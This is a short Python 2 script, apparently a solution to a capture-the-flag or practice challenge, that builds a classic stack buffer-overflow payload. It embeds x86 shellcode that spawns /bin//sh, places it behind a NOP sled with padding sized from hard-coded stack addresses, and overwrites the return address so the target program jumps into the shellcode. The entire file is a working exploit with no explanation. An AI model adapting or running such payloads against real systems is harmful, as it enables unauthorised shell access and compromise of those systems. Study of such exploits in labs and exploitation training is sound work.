import struct


shell = '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80'

name = "dat_wil"
padd = 'a' * (0x100 - len(name))
in1 = name + padd

total_len = 0xffffd6ac - 0xffffd65c - 1
nop = '\x90' * 36
to = struct.pack("<I", 0xffffd670)
padd = 'a' * (total_len - len(nop) - len(shell))
in2 = nop + shell + padd + to

print in1 + in2

